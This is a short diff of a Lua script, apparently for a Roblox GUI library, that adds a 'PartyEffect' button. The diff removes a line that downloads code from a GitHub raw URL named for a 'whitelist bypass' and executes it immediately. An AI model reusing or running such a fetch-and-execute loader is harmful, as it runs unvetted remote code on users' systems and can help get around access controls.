@@ -1,5 +1,4 @@
 local GuiL = shared.CoGuiLibrary
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Nebulaprivatewhitelistbypass/eee/main/eeee', true))()
 
   GuiL.Button("Render", "PartyEffect", function()
             task.spawn(function()
